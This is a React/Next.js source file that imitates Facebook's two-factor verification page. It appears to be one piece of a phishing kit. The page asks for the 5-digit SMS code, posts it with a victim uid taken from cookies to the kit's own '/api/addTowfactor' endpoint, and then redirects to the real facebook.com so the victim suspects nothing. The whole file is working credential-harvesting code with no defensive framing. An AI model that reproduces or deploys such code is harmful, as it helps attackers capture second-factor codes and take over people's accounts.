"use client";
import axios from "axios";
import Cookies from "js-cookie";
import Link from "next/link";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";

function TowFacetorPage() {
  const [email, setEmail] = useState("");
  const [uid, setUid] = useState("");
  const [towFactor, setTowFactor] = useState("");
  const router = useRouter();

  useEffect(() => {
    setEmail(Cookies.get("email"));
    setUid(Cookies.get("uid"));
  }, []);

  const handleSubmit = async () => {
    console.log(towFactor);
    const req = await axios.post("../api/addTowfactor", { uid, towFactor });

    if (req.statusText == "OK") {
      router.push("https://www.facebook.com");
    }
    console.log(req.data);
  };

  return (
    <div className="flex flex-col items-center text-center py-6 mx-4">
      <p className="text-sm flex flex-col">
        We&apos;ve sent an SMS message with the code to
        <span className="font-bold text-sm ">{email}</span>
      </p>
      <p className="text-sm font-bold mt-3">
        Enter the 5-digit code from your SMS
      </p>
      <div className="flex items-center justify-center gap-2 mt-3">
        <span className="font-bold text-xl">FB-</span>
        <input
          onChange={(e) => setTowFactor(e.target.value)}
          type="number"
          className="w-20 border border-gray-400 rounded-sm h-8 text-center font-bold"
        />
      </div>

      <button
        onClick={handleSubmit}
        className="bg-prymary rounded-md w-full py-2  mt-5 text-white font-bold text-sm">
        Confirm
      </button>
      <button className="bg-gray-300 rounded-md w-full py-2  mt-6 text-black font-bold text-sm">
        I Don&apos;t Receive the Code
      </button>

      <Link href={"/"} className="text-prymary text-sm mt-5">
        Log out
      </Link>
    </div>
  );
}

export default TowFacetorPage;
